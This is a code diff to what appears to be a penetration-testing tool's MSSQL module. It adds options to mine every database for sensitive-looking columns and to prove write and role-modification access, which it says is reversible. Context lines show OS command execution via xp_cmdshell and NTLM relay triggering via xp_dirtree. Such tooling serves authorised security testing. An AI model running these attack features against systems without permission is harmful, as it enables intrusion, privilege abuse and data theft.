@@ -2686,6 +2686,34 @@ def cmd_mssql(args: argparse.Namespace) -> int:
                     print(f"      [+] {t['ip']}: linked-server walk reached {len(nodes)} "
                           f"instance(s), {sa_n} as sysadmin")
 
+            # Mine the databases: tables + interesting columns across every database.
+            if args.data:
+                dbnames = [r[0] for r in enum.get("databases", [])]
+                mined = mssql.run_datamine(dbnames, runner)
+                if mined:
+                    df = mssql.datamine_findings(t, mined, creds)
+                    analysis["findings"] = df + analysis["findings"]
+                    for rb in analysis["runbooks"]:
+                        if rb["ip"] == t["ip"]:
+                            rb["datamine"] = mined
+                    sens = sum(1 for v in mined.values() if v["interesting"])
+                    print(f"      [+] {t['ip']}: data-mined "
+                          f"{sum(len(v['tables']) for v in mined.values())} table(s) "
+                          f"across {len(mined)} db(s), {sens} with sensitive columns")
+
+            # Prove write + permission-modify impact, reversibly.
+            if args.prove_write:
+                token = os.urandom(3).hex()
+                ev, werr = mssql.prove_write(t["ip"], creds, token, port=t["port"],
+                                             windows_auth=not args.local_auth)
+                if ev:
+                    analysis["findings"].insert(0, mssql.write_proof_finding(t, ev, creds))
+                    extra = " + role membership" if ev.get("perm") == "1" else ""
+                    print(f"      [+] {t['ip']}: PROVED write impact (field modify"
+                          f"{extra}) - reverted")
+                else:
+                    print(f"      [!] {t['ip']} write proof: {werr}")
+
             # Execute an OS command for effect (xp_cmdshell / OLE / Agent / CLR).
             if args.exec_cmd:
                 out, eerr, ref = mssql.exec_command(
@@ -3431,6 +3459,12 @@ def build_arg_parser() -> argparse.ArgumentParser:
     ms.add_argument("--relay", action="store_true",
                     help="actually trigger the SQL service account to authenticate to "
                          "--lhost (xp_dirtree) so your ntlmrelayx catches it")
+    ms.add_argument("--data", action="store_true",
+                    help="mine the databases: enumerate every table (+ row counts) and "
+                         "find columns/tables with sensitive names across all databases")
+    ms.add_argument("--prove-write", action="store_true",
+                    help="prove write + permission-modify impact REVERSIBLY (create a "
+                         "table, modify a field, toggle a role; everything is reverted)")
     ms.add_argument("--exec", dest="exec_cmd", metavar="CMD",
                     help="execute an OS command on each reachable instance for effect "
                          "and capture the output (needs sysadmin)")
